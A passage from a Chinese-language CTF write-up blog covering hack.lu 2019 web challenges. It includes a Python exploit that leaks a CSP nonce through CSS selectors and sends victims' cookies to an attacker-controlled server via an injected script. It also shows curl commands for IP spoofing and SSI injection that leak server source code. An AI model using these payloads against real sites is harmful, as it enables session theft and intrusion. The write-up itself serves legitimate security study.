script[nonce^="%s"] ~ ul'</span>,</span><br><span class="line">        <span class="string">'body &gt; script[nonce^="%s"] ~ div'</span>,</span><br><span class="line">        <span class="string">'body &gt; script[nonce^="%s"] ~ input'</span>,</span><br><span class="line">        <span class="string">'body &gt; script[nonce^="%s"] ~ nav'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ #messages'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ #status'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ #chatbox'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ #recaptcha'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ nav &gt; a'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ nav &gt; #report-link'</span>,</span><br><span class="line">        <span class="string">'script[nonce^="%s"] ~ nav &gt; #username'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ #messages'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ #status'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ #chatbox'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ #recaptcha'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; a'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; #report-link'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; #username'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; [href="/"]'</span>,</span><br><span class="line">        <span class="string">'body script[nonce^="%s"] ~ nav &gt; [href="#"]'</span>,</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(nonce, url)</span>:</span></span><br><span class="line">    x = <span class="string">"""&lt;iframe srcdoc="&lt;script nonce=%s&gt;alert(document.cookie); var x = document.createElement('img'); x.src = '%s/res?c=' + document.cookie;&lt;/script&gt;"&gt;&lt;/iframe&gt;"""</span> % (nonce, url)</span><br><span class="line">    msg = &#123;<span class="string">"username"</span> : <span class="string">"aaa"</span>, <span class="string">"type"</span>: <span class="string">"gabbr-message"</span>, <span class="string">"content"</span>: x&#125;</span><br><span class="line">    print(json.dumps(msg))</span><br><span class="line">    socket.send(json.dumps(msg))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_style</span><span class="params">(c, url)</span>:</span></span><br><span class="line">    style = <span class="string">"&lt;style&gt;"</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">"abcdef"</span> + string.digits:</span><br><span class="line">        style = style + ((payloads[len(c)] + <span class="string">'&#123; background:url("%s/?match=%s") &#125; '</span>) % (c + x, url, c + x))</span><br><span class="line">    style = style + <span class="string">"&lt;/style&gt;"</span></span><br><span class="line">    <span class="keyword">return</span> style</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span><span class="params">()</span>:</span></span><br><span class="line">    match = request.args.get(<span class="string">'match'</span>)</span><br><span class="line">    print(match)</span><br><span class="line">    <span class="keyword">if</span> len(match) == <span class="number">24</span>:</span><br><span class="line">        exploit(match, URL)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        send_req(match)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"a"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/res')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">res</span><span class="params">()</span>:</span></span><br><span class="line">    match = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    print(match)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"a"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_req</span><span class="params">(match)</span>:</span></span><br><span class="line">    msg = &#123;<span class="string">"username"</span> : <span class="string">"aaa"</span>, <span class="string">"type"</span>: <span class="string">"gabbr-message"</span>, <span class="string">"content"</span>: generate_style(match, URL)&#125;</span><br><span class="line">    socket.send(json.dumps(msg))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    uri = <span class="string">"wss://gabbr.hitme.tasteless.eu/"</span> + sys.argv[<span class="number">1</span>]</span><br><span class="line">    socket = websocket.WebSocket()</span><br><span class="line">    socket.connect(uri)</span><br><span class="line">    print(generate_style(<span class="string">""</span>, URL)) <span class="comment"># This outputs the initial payload, we did it manually to avoid certain concurrency issues</span></span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure>

<h4 id="hack-lu-2019-Trees-For-Future"><a href="#hack-lu-2019-Trees-For-Future" class="headerlink" title="hack.lu 2019 - Trees For Future"></a>hack.lu 2019 - Trees For Future</h4><h5 id="用到的知识。"><a href="#用到的知识。" class="headerlink" title="用到的知识。"></a>用到的知识。</h5><h6 id="SSI注入，连接回本地MySQL，二次盲注SQLi"><a href="#SSI注入，连接回本地MySQL，二次盲注SQLi" class="headerlink" title="SSI注入，连接回本地MySQL，二次盲注SQLi"></a>SSI注入，连接回本地MySQL，二次盲注SQLi</h6><h5 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h5><h6 id="我们是TreesForFuture。我们积极致力于使更多的树木生长在这个星球。"><a href="#我们是TreesForFuture。我们积极致力于使更多的树木生长在这个星球。" class="headerlink" title="我们是TreesForFuture。我们积极致力于使更多的树木生长在这个星球。"></a>我们是TreesForFuture。我们积极致力于使更多的树木生长在这个星球。</h6><h6 id="最近，我们雇用了一家承包商为我们创建了一个网站。"><a href="#最近，我们雇用了一家承包商为我们创建了一个网站。" class="headerlink" title="最近，我们雇用了一家承包商为我们创建了一个网站。"></a>最近，我们雇用了一家承包商为我们创建了一个网站。</h6><h6 id="题目的地址在这里http-31-22-123-49-1908"><a href="#题目的地址在这里http-31-22-123-49-1908" class="headerlink" title="题目的地址在这里http://31.22.123.49:1908"></a>题目的地址在这里<a href="http://31.22.123.49:1908." target="_blank" rel="noopener">http://31.22.123.49:1908</a></h6><h4 id="题目总览"><a href="#题目总览" class="headerlink" title="题目总览"></a>题目总览</h4><h6 id="这个挑战提供了一个简单的单页网站，其中充满了Lorem-ipsum引号和一颗树的图片。"><a href="#这个挑战提供了一个简单的单页网站，其中充满了Lorem-ipsum引号和一颗树的图片。" class="headerlink" title="这个挑战提供了一个简单的单页网站，其中充满了Lorem ipsum引号和一颗树的图片。"></a>这个挑战提供了一个简单的单页网站，其中充满了Lorem ipsum引号和一颗树的图片。</h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/site.png" alt></p>
<h6 id="对页面HTML代码的快速分析显示了托管图片的路径。"><a href="#对页面HTML代码的快速分析显示了托管图片的路径。" class="headerlink" title="对页面HTML代码的快速分析显示了托管图片的路径。"></a>对页面HTML代码的快速分析显示了托管图片的路径。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;/internal/img/logo_white.png&quot; alt=&quot;Avatar&quot; width=&quot;300&quot; height=&quot;300&quot;&gt;</span><br></pre></td></tr></table></figure>

<h6 id="这个网站在http-31-22-123-49-1908-internal-login"><a href="#这个网站在http-31-22-123-49-1908-internal-login" class="headerlink" title="这个网站在http://31.22.123.49:1908/internal/login"></a>这个网站在<a href="http://31.22.123.49:1908/internal/login" target="_blank" rel="noopener">http://31.22.123.49:1908/internal/login</a></h6><p><img src="https://raw.githubusercontent.com/ljdd520/images/master/img/internal.png" alt></p>
<h6 id="这个页面提供了注册，登陆和管理一个页面，与此同时该页面告诉我们不是管理员。"><a href="#这个页面提供了注册，登陆和管理一个页面，与此同时该页面告诉我们不是管理员。" class="headerlink" title="这个页面提供了注册，登陆和管理一个页面，与此同时该页面告诉我们不是管理员。"></a>这个页面提供了注册，登陆和管理一个页面，与此同时该页面告诉我们不是管理员。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;custom_tooltip&quot;&gt;You&apos;re not admin.&lt;span class=&quot;custom_tooltiptext&quot;&gt;XXX.XXX.XXX.XXX isn&apos;t admins IP.&lt;/span&gt;&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h5 id="开始分析："><a href="#开始分析：" class="headerlink" title="开始分析："></a>开始分析：</h5><h6 id="显然，要被识别为管理员，我们需要来自特定的IP。为此，我们要先暴露一下主机内部的IP。"><a href="#显然，要被识别为管理员，我们需要来自特定的IP。为此，我们要先暴露一下主机内部的IP。" class="headerlink" title="显然，要被识别为管理员，我们需要来自特定的IP。为此，我们要先暴露一下主机内部的IP。"></a>显然，要被识别为管理员，我们需要来自特定的IP。为此，我们要先暴露一下主机内部的IP。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X &apos;&apos; http://31.22.123.49:1908/internal/</span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.29 (Ubuntu) Server at 127.0.1.1 Port 13337&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<h6 id="一旦我们知道内网地址是在127-0-0-1，端口是在13337，我们可以尝试添加X-Forwarded-For来让服务器相信我们的原始IP是127-0-0-1。"><a href="#一旦我们知道内网地址是在127-0-0-1，端口是在13337，我们可以尝试添加X-Forwarded-For来让服务器相信我们的原始IP是127-0-0-1。" class="headerlink" title="一旦我们知道内网地址是在127.0.0.1，端口是在13337，我们可以尝试添加X-Forwarded-For来让服务器相信我们的原始IP是127.0.0.1。"></a>一旦我们知道内网地址是在<code>127.0.0.1</code>，端口是在<code>13337</code>，我们可以尝试添加<code>X-Forwarded-For</code>来让服务器相信我们的原始IP是<code>127.0.0.1</code>。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b &apos;PHPSESSID=qloervi3nq447sdlukt2cp0g29&apos; -H &apos;X-Forwarded-For: 127.0.0.1&apos; http://31.22.123.49:1908/internal/admin</span><br><span class="line">...</span><br><span class="line">&lt;div class=&quot;main&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;custom_tooltip&quot;&gt;You&apos;re not admin.&lt;span class=&quot;custom_tooltiptext&quot;&gt;127.0.0.1, XXX.XXX.XXX.XXX isn&apos;t admins IP.&lt;/span&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<h6 id="我们可以看到响应是成功的，但是没有授予任何的管理员权限。"><a href="#我们可以看到响应是成功的，但是没有授予任何的管理员权限。" class="headerlink" title="我们可以看到响应是成功的，但是没有授予任何的管理员权限。"></a>我们可以看到响应是成功的，但是没有授予任何的管理员权限。</h6><h6 id="经过数小时的随机尝试，我们发现可以进行SSI注入来泄露页面的PHP源代码。"><a href="#经过数小时的随机尝试，我们发现可以进行SSI注入来泄露页面的PHP源代码。" class="headerlink" title="经过数小时的随机尝试，我们发现可以进行SSI注入来泄露页面的PHP源代码。"></a>经过数小时的随机尝试，我们发现可以进行<code>SSI</code>注入来泄露页面的PHP源代码。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -b &apos;PHPSESSID=qloervi3nq447sdlukt2cp0g29&apos; -H &apos;X-Forwarded-For: &lt;!--#include virtual=&quot;admin.phps&quot; --&gt;&apos; http://31.22.123.49:1908/internal/admin</span><br></pre></td></tr></table></figure>

<h6 id="我们对所有的页面重复此过程去获取全部源代码。不过服务器阻止我们访问位于当前目录以外的文件，所以我们不能访问下列的文件：-config-php，-db-config-php，-db-credentials-php。"><a href="#我们对所有的页面重复此过程去获取全部源代码。不过服务器阻止我们访问位于当前目录以外的文件，所以我们不能访问下列的文件：-config-php，-db-config-php，-db-credentials-php。" class="headerlink" title="我们对所有的页面重复此过程去获取全部源代码。不过服务器阻止我们访问位于当前目录以外的文件，所以我们不能访问下列的文件：../config.php，../db_config.php，../db_credentials.php。"></a>我们对所有的页面重复此过程去获取<a href="https://w0y.at/data/ctf/hack.lu2019/trees-for-future.tar.gz" target="_blank" rel="noopener">全部源代码</a>。不过服务器阻止我们访问位于当前目录以外的文件，所以我们不能访问下列的文件：<code>../config.php</code>，<code>../db_config.php</code>，<code>../db_credentials.php</code>。</h6><h5 id="拿到源代码后开始分析："><a href="#拿到源代码后开始分析：" class="headerlink" title="拿到源代码后开始分析："></a>拿到源代码后开始分析：</h5><h6 id="来自login-php："><a href="#来自login-php：" class="headerlink" title="来自login.php："></a>来自<code>login.php</code>：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// We had some issues with double encoded values. This fixed it.</span><br><span class="line">$parmas = parse_str(urldecode(file_get_contents(&quot;php://input&quot;)));</span><br></pre></td></tr></table></figure>

<h6 id="在这里，该parse-str-函数用于解析POST请求的正文。PHP文档明确的指出。"><a href="#在这里，该parse-str-函数用于解析POST请求的正文。PHP文档明确的指出。" class="headerlink" title="在这里，该parse_str()函数用于解析POST请求的正文。PHP文档明确的指出。"></a>在这里，该<code>parse_str()</code>函数用于解析POST请求的正文。PHP文档明确的指出。</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Warning Using this function without the result parameter is highly DISCOURAGED and DEPRECATED as of PHP 7.2. </span><br><span class="line">Dynamically setting variables in function&apos;s scope suffers from exactly same problems as register_globals. </span><br><span class="line">Read section on security of Using Register Globals explaining why it is dangerous.</span><br></pre></td></tr></table></figure>

<h6 id="事实上，我们可以通过在POST请求上传递变量来设置和覆盖变量。"><a href="#事实上，我们可以通过在POST请求上传递变量来设置和覆盖变量。" class="headerlink" title="事实上，我们可以通过在POST请求上传递变量来设置和覆盖变量。"></a>事实上，我们可以通过在POST请求上传递变量来设置和覆盖变量。</h6><h6 id="后续请看https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture"><a href="#后续请看https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture" class="headerlink" title="后续请看https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture"></a>后续请看<a href="https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture" target="_blank" rel="noopener">https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture</a></h6><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-w0y-at-writeup-2019-10-24-hacklu-2019-car-repair-shop-html"><a href="#https-w0y-at-writeup-2019-10-24-hacklu-2019-car-repair-shop-html" class="headerlink" title="https://w0y.at/writeup/2019/10/24/hacklu-2019-car-repair-shop.html"></a><a href="https://w0y.at/writeup/2019/10/24/hacklu-2019-car-repair-shop.html" target="_blank" rel="noopener">https://w0y.at/writeup/2019/10/24/hacklu-2019-car-repair-shop.html</a></h6><h6 id="https-gist-github-com-terjanq-fdb23ae109446b826a4b37df88efae07-file-car-repair-js"><a href="#https-gist-github-com-terjanq-fdb23ae109446b826a4b37df88efae07-file-car-repair-js" class="headerlink" title="https://gist.github.com/terjanq/fdb23ae109446b826a4b37df88efae07#file-car_repair-js"></a><a href="https://gist.github.com/terjanq/fdb23ae109446b826a4b37df88efae07#file-car_repair-js" target="_blank" rel="noopener">https://gist.github.com/terjanq/fdb23ae109446b826a4b37df88efae07#file-car_repair-js</a></h6><h6 id="https-github-com-LetzPwn-ctf-writeups-tree-master-hack-lu-2019-Numtonce"><a href="#https-github-com-LetzPwn-ctf-writeups-tree-master-hack-lu-2019-Numtonce" class="headerlink" title="https://github.com/LetzPwn/ctf-writeups/tree/master/hack_lu_2019/Numtonce"></a><a href="https://github.com/LetzPwn/ctf-writeups/tree/master/hack_lu_2019/Numtonce" target="_blank" rel="noopener">https://github.com/LetzPwn/ctf-writeups/tree/master/hack_lu_2019/Numtonce</a></h6><h6 id="https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture"><a href="#https-github-com-lavish-ctf-writeups-tree-master-hacklu2019-TreesForFuture" class="headerlink" title="https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture"></a><a href="https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture" target="_blank" rel="noopener">https://github.com/lavish/ctf-writeups/tree/master/hacklu2019-TreesForFuture</a></h6>
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/12/19/2019balsnCTF的Warmup和koreanfish赛后复现/" rel="next" title="2019balsnCTF的Warmup和koreanfish赛后复现">
                <i class="fa fa-chevron-left"></i> 2019balsnCTF的Warmup和koreanfish赛后复现
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/12/21/2019hack-luCTF的numtonce的环境搭建到解决的详细过程/" rel="prev" title="2019hack.luCTF的numtonce的环境搭建到解决的详细过程">
                2019hack.luCTF的numtonce的环境搭建到解决的详细过程 <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目录
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            站点概览
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
            
              <p class="site-author-name" itemprop="name">Ljdd520</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">30</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
                      
                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                友情链接
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#car-repair-shop"><span class="nav-number">1.1.</span> <span class="nav-text">car-repair-shop</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目涉及到的知识。"><span class="nav-number">1.2.</span> <span class="nav-text">题目涉及到的知识。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#原型链的污染，url正则表达式绕过，DOM-XSS"><span class="nav-number">1.2.1.</span> <span class="nav-text">原型链的污染，url正则表达式绕过，DOM-XSS</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目描述："><span class="nav-number">1.3.</span> <span class="nav-text">题目描述：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#题目地址如下Enter-the-shop"><span class="nav-number">1.3.1.</span> <span class="nav-text">题目地址如下Enter the shop</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#题目分析："><span class="nav-number">1.4.</span> <span class="nav-text">题目分析：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#访问题目给的链接后将呈现下面的界面："><span class="nav-number">1.4.1.</span> <span class="nav-text">访问题目给的链接后将呈现下面的界面：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#在这里我们可以看到几个按钮，单击这些按钮将执行某些功能。"><span class="nav-number">1.4.1.1.</span> <span class="nav-text">在这里我们可以看到几个按钮，单击这些按钮将执行某些功能。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是一个消息框，该消息框在执行某些功能后会更新内容。"><span class="nav-number">1.4.1.2.</span> <span class="nav-text">下面是一个消息框，该消息框在执行某些功能后会更新内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在底部，还有一个名为get-your-cookie的按钮，该按钮将导致一个可以引用URL的子页面"><span class="nav-number">1.4.1.3.</span> <span class="nav-text">在底部，还有一个名为get your cookie的按钮，该按钮将导致一个可以引用URL的子页面</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#提交url后浏览器将会自动访问。"><span class="nav-number">1.4.1.4.</span> <span class="nav-text">提交url后浏览器将会自动访问。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个大图看起来我们需要去构造一个url包含我们的payload去提交它。"><span class="nav-number">1.4.1.5.</span> <span class="nav-text">这个大图看起来我们需要去构造一个url包含我们的payload去提交它。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#当他被访问时，我们必须以某种方式参入这个flag。"><span class="nav-number">1.4.1.6.</span> <span class="nav-text">当他被访问时，我们必须以某种方式参入这个flag。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个按钮的名字个数我们这个flag在cookie里面。"><span class="nav-number">1.4.1.7.</span> <span class="nav-text">这个按钮的名字个数我们这个flag在cookie里面。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#该页面很小并且包含了其他几个有趣的文件："><span class="nav-number">1.4.2.</span> <span class="nav-text">该页面很小并且包含了其他几个有趣的文件：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#util-js负责建立类似于事件处理程序的页面，然后开始执行一些代码。"><span class="nav-number">1.4.3.</span> <span class="nav-text">util.js负责建立类似于事件处理程序的页面，然后开始执行一些代码。</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#这autoStart函数将会执行repair，ignition和powerOn汽车的方法作为参数传递。"><span class="nav-number">1.4.3.1.</span> <span class="nav-text">这autoStart函数将会执行repair，ignition和powerOn汽车的方法作为参数传递。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这repair函数访问该URL并解析与相同名称的功能的查询参数的JSON对象："><span class="nav-number">1.4.3.2.</span> <span class="nav-text">这repair函数访问该URL并解析与相同名称的功能的查询参数的JSON对象：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#该代码将JSON对象中提供的属性和值与该Car对象合并。这很危险，并且会造成原型链污染漏洞。详细介绍请看此处"><span class="nav-number">1.4.3.3.</span> <span class="nav-text">该代码将JSON对象中提供的属性和值与该Car对象合并。这很危险，并且会造成原型链污染漏洞。详细介绍请看此处</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们能重写Car的-proto-属性，并且引入其他的属性。"><span class="nav-number">1.4.3.4.</span> <span class="nav-text">我们能重写Car的__proto__属性，并且引入其他的属性。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#接下来是这个ignition函数。"><span class="nav-number">1.4.3.5.</span> <span class="nav-text">接下来是这个ignition函数。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#要修复，bugatti我们只要key在url中指定emoji表情的值，然后repair-function将完成其工作："><span class="nav-number">1.4.3.6.</span> <span class="nav-text">要修复，bugatti我们只要key在url中指定emoji表情的值，然后repair-function将完成其工作：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这将把我们带到porsche。这里对repair和点火功能进行了一些自定义："><span class="nav-number">1.4.3.7.</span> <span class="nav-text">这将把我们带到porsche。这里对repair和点火功能进行了一些自定义：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个ignition函数是不重要的，因为他只是输出一些文本。"><span class="nav-number">1.4.3.8.</span> <span class="nav-text">这个ignition函数是不重要的，因为他只是输出一些文本。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#而这个repair函数有一些特殊的方法。"><span class="nav-number">1.4.3.9.</span> <span class="nav-text">而这个repair函数有一些特殊的方法。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-在bugatti启动之前。"><span class="nav-number">1.4.3.10.</span> <span class="nav-text">1. 在bugatti启动之前。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-porsche对象的MD5值需要是9cdfb439c7876e703e307864c9167a15"><span class="nav-number">1.4.3.11.</span> <span class="nav-text">2. porsche对象的MD5值需要是9cdfb439c7876e703e307864c9167a15</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#1-已经使用了正确的key在url中，是非常好的。"><span class="nav-number">1.4.3.12.</span> <span class="nav-text">(1) 已经使用了正确的key在url中，是非常好的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-需要去做的是。这个MD5的值是等于这个字符串lol-你可以查看最受欢迎的hash表，例如：crackstation-net-。"><span class="nav-number">1.4.3.13.</span> <span class="nav-text">(2) 需要去做的是。这个MD5的值是等于这个字符串lol(你可以查看最受欢迎的hash表，例如：crackstation.net)。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#那么我们这样去计算对象的哈希值呢？看到jquery-md5-js他展现了计算对象的哈希值，将显示的通过toString方法获得对象的字符串表示的哈希值。"><span class="nav-number">1.4.3.14.</span> <span class="nav-text">那么我们这样去计算对象的哈希值呢？看到jquery.md5.js他展现了计算对象的哈希值，将显示的通过toString方法获得对象的字符串表示的哈希值。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#要改变对象的字符串表达形式，我们需要去重写这个方法，但是在这是不可能的。"><span class="nav-number">1.4.3.15.</span> <span class="nav-text">要改变对象的字符串表达形式，我们需要去重写这个方法，但是在这是不可能的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们不能创建或者改变这个方法对于通过jquery的扩展对于repair函数，仅仅改变属性，由于他是JSON。"><span class="nav-number">1.4.3.16.</span> <span class="nav-text">我们不能创建或者改变这个方法对于通过jquery的扩展对于repair函数，仅仅改变属性，由于他是JSON。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#为了解决这个问题，我们可以使用一个有趣的javaScript数组属性和前面提到的原型链污染。当数组在javascript中转换为字符串时，他将成为由组成的元素的字符串表示形式。"><span class="nav-number">1.4.3.17.</span> <span class="nav-text">为了解决这个问题，我们可以使用一个有趣的javaScript数组属性和前面提到的原型链污染。当数组在javascript中转换为字符串时，他将成为由组成的元素的字符串表示形式。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此-quot-lol-quot-变成-quot-lol-quot-。现在结合原型链的污染，可以轻松的通过下面的验证："><span class="nav-number">1.4.3.18.</span> <span class="nav-text">因此[&quot;lol&quot;]变成&quot;lol&quot;。现在结合原型链的污染，可以轻松的通过下面的验证：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#但是在，payload中我们无法直接将原型设置为数组，否则我将失去Car类提供的功能。我们可以通过不直接将原型设置为数组，而是将原型设置为数组的对象来避免这种情况。"><span class="nav-number">1.4.4.</span> <span 